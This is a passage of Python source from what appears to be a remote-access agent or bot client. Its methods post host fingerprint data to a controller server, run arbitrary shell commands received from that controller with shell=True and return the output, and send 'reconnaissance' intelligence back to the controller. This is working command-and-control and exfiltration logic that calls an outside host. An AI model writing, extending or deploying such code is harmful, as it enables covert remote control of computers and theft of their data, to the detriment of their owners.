            else:
                # Basic system info
                info = {
                    "hostname": socket.gethostname(),
                    "platform": platform.system(),
                    "architecture": platform.architecture(),
                    "processor": platform.processor(),
                    "timestamp": time.time()
                }
            
            response = requests.post(
                f"{self.server_url}/system-info/{self.agent_id}",
                json=info,
                timeout=10
            )
            
            if response.status_code == 200:
                print("System info sent successfully")
            else:
                print(f"Failed to send system info: {response.status_code}")
                
        except Exception as e:
            print(f"Error sending system info: {e}")
    
    def _execute_enhanced_system_command(self, command: str):
        """Execute a system command"""
        try:
            if not command.strip():
                return
            
            print(f"Executing system command: {command}")
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = {
                "command": command,
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "timestamp": time.time()
            }
            
            # Send result back to controller
            response = requests.post(
                f"{self.server_url}/command-result/{self.agent_id}",
                json=output,
                timeout=10
            )
            
            if response.status_code == 200:
                print("Command result sent successfully")
            else:
                print(f"Failed to send command result: {response.status_code}")
                
        except subprocess.TimeoutExpired:
            print("Command execution timed out")
        except Exception as e:
            print(f"Error executing command: {e}")
    
    def _perform_enhanced_reconnaissance(self):
        """Perform system reconnaissance"""
        if not self.security:
            print("Security features not available for reconnaissance")
            return
        
        try:
            print("Performing reconnaissance...")
            intel = self.security.gather_intelligence()
            
            # Send encrypted intelligence to controller
            response = requests.post(
                f"{self.server_url}/intelligence/{self.agent_id}",
                json=intel,
                timeout=30
            )
            
            if response.status_code == 200:
                print("Intelligence sent successfully")
            else:
                print(f"Failed to send intelligence: {response.status_code}")
                
        except Exception as e:
            print(f"Reconnaissance error: {e}")

# ========================================================================================
# END OF COMBINED MODULES
# ========================================================================================